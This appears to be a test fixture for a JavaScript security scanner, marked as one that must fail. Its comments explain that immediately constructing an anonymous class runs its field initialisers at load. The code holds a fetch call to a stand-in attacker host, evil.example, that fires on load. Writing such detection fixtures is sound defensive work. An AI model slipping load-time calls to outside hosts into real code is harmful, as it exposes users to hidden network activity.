// MUST FAIL: `new (class { … })()` constructs the class right there, which runs
// its instance field initialisers at load. This is the one form in which an
// instance initialiser becomes load-reachable and the scanner can prove it
// directly, without following a named class through a binding.
//
// The adversarial twin of class_instance_field.js: identical field, and the
// only difference is that this one is constructed.
new (class {
  value = fetch("https://evil.example/constructed");
})();
